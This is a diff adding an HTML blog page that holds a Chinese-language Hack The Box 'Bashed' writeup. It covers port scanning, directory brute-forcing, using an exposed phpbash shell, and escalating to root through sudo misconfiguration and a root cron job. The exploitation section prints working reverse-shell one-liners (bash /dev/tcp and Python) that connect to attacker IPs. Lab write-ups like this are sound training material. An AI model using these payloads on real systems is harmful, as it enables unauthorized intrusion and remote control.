@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.jpg" />
+    
+
+    <title>
+        
+          Bashed Writeup - 阿毛毛の坑
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.jpg">
+    <span>阿毛毛の坑</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  <h1 id="Initialized-on">Initialized on</h1>
+<h1 id="November-4-2020">November 4, 2020</h1>
+<h1 id="写点啥儿">写点啥儿</h1>
+<h1 id="">-</h1>
+<h1 id="-v2">-</h1>
+<h1 id="OSCP-BATTLE"><strong>[ OSCP BATTLE ]</strong></h1>
+<ul>
+<li><a href="/oscp/In-The-Beginning">In The Beginning</a></li>
+</ul>
+<h2 id="Prepration">Prepration</h2>
+<ul>
+<li><a href="/oscp/KALI-Deploy">KALI Deploy</a></li>
+<li><a href="/oscp/Training-Plan">Training Plan</a></li>
+</ul>
+<h2 id="Note">Note</h2>
+<ul>
+<li><a href="/oscp/Nmap-Tips">Nmap Tips</a></li>
+<li><a href="/oscp/Version-Compare">Version Compare</a></li>
+<li><a href="/oscp/Linux-Priv-Esc">Linux Priv Esc</a></li>
+</ul>
+<h1 id="-v3">-</h1>
+<h1 id="Hack-The-Box-Writeup"><strong>[ Hack The Box Writeup ]</strong></h1>
+<ul>
+<li><a href="/htb/HTB-Environment">HTB Environment</a></li>
+</ul>
+<h2 id="HTB-Linux">HTB Linux</h2>
+<ul>
+<li><a href="/htb/htb-linux/Lame-Writeup">Lame Writeup</a></li>
+<li><a href="/htb/htb-linux/Shocker-Writeup">Shocker Writeup</a></li>
+<li><a href="/htb/htb-linux/Bashed-Writeup">Bashed Writeup</a></li>
+</ul>
+<h2 id="HTB-Windows">HTB Windows</h2>
+<ul>
+<li><a href="/">nothing here</a></li>
+</ul>
+<h1 id="-v4">-</h1>
+<h1 id="Cyber-Security"><strong>[ Cyber Security ]</strong></h1>
+<h2 id="Skills">Skills</h2>
+<ul>
+<li><a href="/">skills</a></li>
+</ul>
+<h2 id="Analize">Analize</h2>
+<ul>
+<li><a href="/">vuls</a></li>
+</ul>
+<h1 id="-v5">-</h1>
+<h1 id="Essay"><strong>[ Essay ]</strong></h1>
+<ul>
+<li><a href="/">该做题了</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h1 id="Bashed-Writeup">Bashed Writeup</h1>
+<p><img src="./0.png" alt=""></p>
+<h2 id="0x01-信息收集">0x01 信息收集</h2>
+<p>先手 <code>nmap</code>。</p>
+<h3 id="1、TCP-Scan">1、TCP Scan</h3>
+<pre class="language-java" data-language="java"><code class="language-java">nmap <span class="token operator">-</span><span class="token class-name">A</span> <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token operator">-</span>oA nmap<span class="token operator">/</span>tcp <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.68</span></code></pre>
+<p>就开了一个 80。</p>
+<ul>
+<li><strong>80</strong>: apache 2.4.18，可能是漏洞版本，开放了 web 页面。</li>
+</ul>
+<p><img src="./1.png" alt=""></p>
+<h3 id="2、UDP-Scan">2、UDP Scan</h3>
+<pre class="language-java" data-language="java"><code class="language-java">nmap <span class="token operator">-</span>sU <span class="token operator">-</span><span class="token class-name">A</span> <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token operator">-</span>oA nmap<span class="token operator">/</span>udp <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.68</span></code></pre>
+<p>未见开放。</p>
+<p><strong>共开放了 <code>tcp 80</code> 端口。</strong></p>
+<h2 id="0x02-漏洞利用">0x02 漏洞利用</h2>
+<h3 id="1、Port-80">1、Port 80</h3>
+<p>浏览器打开主页是 phpbash 的介绍（一个页面命令行），同时翻到子一个子页面给的交互示意动图，可以感觉到这里大概率是个立足点。</p>
+<p><img src="./2.png" alt=""><br>
+页面上获取不到更多信息，这个时候又到目录扫描的好时光了，照例 <code>dirbuster</code> 默认字典跑一下，既然是 php 站点，后缀先用默认的 <code>.php</code>。<br>
+扫到可疑文件。</p>
+<p><img src="./3.png" alt=""><br>
+/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt<br>
+nohup bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1</p>
+<p>浏览器打开，是一个页面命令行，身份是普通用户 <code>www-data</code>。</p>
+<p><img src="./4.png" alt=""></p>
+<p>页面下的 shell 多有不便，先弹一个 shell 出来。</p>
+<p>这里应该是做了限制，尝试 <code>bash</code>、<code>nc</code> 均无效，甚至怀疑其了人生是不是做了网络隔离，但是用 <code>curl</code> 测试又是通的，遂把其他脚本也试了一轮，最后 <code>python</code> 成功反弹。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class="token variable"><span class="token punctuation">((</span>"<span class="token number">10.10</span><span class="token number">.14</span><span class="token number">.4</span>"<span class="token punctuation">,</span><span class="token number">4445</span><span class="token punctuation">))</span></span>;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre>
+<h2 id="0x03-提权">0x03 提权</h2>
+<p>首先关注一下 sudo 权限配置。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -l</code></pre>
+<p>这个配置意思是 <code>以 scriptmanager 用户的身份无需密码执行任意命令</code>。</p>
+<p><img src="./5.png" alt=""><br>
+狂喜，跑一个 <code>id</code> 看看，返回显示还是普通用户。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -u scriptmanager <span class="token function">id</span></code></pre>
+<p><img src="./6.png" alt=""><br>
+并且尝试花式 <code>su</code> 到 <code>root</code> 都没用，一律需要输密码，切不上去，人傻了。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -u scriptmanager <span class="token function">su</span>
+<span class="token function">sudo</span> -u scriptmanager <span class="token function">su</span> -
+<span class="token function">sudo</span> -u scriptmanager <span class="token function">sudo</span> <span class="token function">su</span></code></pre>
+<p><img src="./7.png" alt=""></p>
+<blockquote>
+<p><code>su</code> 需要一个完全互动的 TTY，否则会报错 <code>su: must be run from a terminal</code>。切换 TTY：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>
+<p><img src="./8.png" alt=""></p>
+</blockquote>
+<p>看一下 sudo 版本：<code>1.8.16</code>，查到一个漏洞 <a target="_blank" rel="noopener" href="https://paper.seebug.org/1057/">CVE-2019-14287</a>，但是无法利用，似乎还需要当前用户的密码？<br>
+毫无头绪的时候思考一下盒子设计逻辑，首先 scriptmanager 肯定是突破口，但又不是管理员，那么是否想让我<strong>用 scriptmanager 做一些 www-data 做不到的事情</strong>？</p>
+<p>切换到 <code>scriptmanager</code>。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -u scriptmanager /bin/bash</code></pre>
+<p>翻一下所属用户为 <code>scriptmanager</code> 的文件是否能发现端倪，定位到根目录下的 <code>scripts</code> 文件夹。</p>
+<p><img src="./9.png" alt=""><br>
+里面有两个文件，根据内容推断出: <code>scriptmanager 的 python</code> 脚本执行后会生成一个 <code>root 的 txt</code>，说明意味着<strong>这里的 python 文件会以 root 权限执行</strong>，即使暂时不知道原因。</p>
+<p><img src="./10.png" alt=""><br>
+所以在这里写入一个 python 的反弹 shell，试跑一下，还是普通用户。</p>
+<p><img src="./13.png" alt=""><br>
+<img src="./11.png" alt=""><br>
+说明肯定不是由用户来执行，而且 <code>test.txt</code> 的更新时间在不停变化，一定有个 root 的计划任务在一直跑这个 <code>test.py</code>。此时断开 shell，打开监听，等待计划任务执行。</p>
+<p><img src="./14.png" alt=""><br>
+果不其然得到一个 root shell。</p>
+<p><img src="./12.png" alt=""></p>
+<blockquote>
+<p>事后查看计划任务，确实。</p>
+<p><img src="./15.png" alt=""></p>
+</blockquote>
+<h2 id="0x04-攻击节点">0x04 攻击节点</h2>
+<p>信息收集 -&gt; 目录扫描 -&gt; 80.phpbash-RCE(www-data) -&gt; sudo 配置不当切换用户(scriptmanager) -&gt; crontab-python(root)</p>
+<h2 id="0x05-学到什么">0x05 学到什么</h2>
+<h4 id="1、渗透的时候不要为了省事疯狂-ls，能-ls-la-的时候尽量用，避免遗漏重要信息。">1、渗透的时候不要为了省事疯狂 <code>ls</code>，能 <code>ls -la</code> 的时候尽量用，避免遗漏重要信息。</h4>
+<h4 id="2、对于不直接的线索要冷静分析，比如看到一个-NOPASSWD，却不是-root，也不要谎，都是套路。">2、对于不直接的线索要冷静分析，比如看到一个 NOPASSWD，却不是 root，也不要谎，都是套路。</h4>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/favicon.jpg" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>amm907</div>
+      <div>2020-11-12</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/Hack-The-Box/">Hack The Box</a>
+
+      
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
